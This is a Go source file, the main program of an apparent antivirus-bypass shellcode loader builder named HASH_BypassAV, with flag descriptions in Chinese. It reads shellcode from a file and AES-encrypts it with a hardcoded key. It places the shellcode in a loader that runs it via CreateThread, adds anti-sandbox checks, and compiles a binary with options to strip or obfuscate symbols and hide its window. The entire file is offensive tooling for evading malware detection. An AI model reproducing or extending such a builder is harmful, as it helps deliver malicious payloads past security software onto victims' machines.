package main

import (
	"HASH_BypassAV/build"
	"HASH_BypassAV/encrypt"
	"HASH_BypassAV/parser"
	"HASH_BypassAV/sandbox"
	"encoding/hex"
	"flag"
	"strings"
)

func main() {

	var (
		c_2_shellcode  bool
		shellcode_path string
		module         string
		enc            string
		key            string
		debug          bool
		strip          bool
		hide           bool
		sb             bool
	)

	flag.StringVar(&shellcode_path, "s", "shellcode.txt", "shellcode 文件位置")
	flag.BoolVar(&c_2_shellcode, "c", true, "shellcode 文件格式：C / bin")
	flag.StringVar(&module, "m", "CreateThread", "使用模块")
	flag.StringVar(&enc, "e", "AES", "是否加密 shellcode")
	flag.StringVar(&key, "k", "#HvL%$o0oNNoOZnk#o2qbqCeQB13XeIR", "加密密钥")
	flag.BoolVar(&debug, "d", true, "是否去除符号表")
	flag.BoolVar(&hide, "hide", false, "是否隐藏窗口")
	flag.BoolVar(&strip, "strip", false, "是否符号混淆")
	flag.BoolVar(&sb, "sb", true, "是否开启反沙箱")
	flag.Parse()

	var shellcode, code string

	if c_2_shellcode {
		shellcode = parser.ParseShellCode(shellcode_path)
	} else {
		shellcode = hex.EncodeToString(parser.OriginShellCode(shellcode_path))
	}

	if enc != "0" {
		enc = strings.ToUpper(enc)
		ss, ok := encrypt.EncryptShellcode(shellcode, enc, key)
		if !ok {
			return
		}
		shellcode = hex.EncodeToString(ss)
		code = parser.GetFinalCode(module, shellcode)
		code = encrypt.DecryptReplace(code, enc, key)
	} else {
		code = parser.GetFinalCode(module, shellcode)
	}

	if sb {
		code = sandbox.Addsandbox(code)
	}

	build.Build(code, module, debug, strip, hide)
}
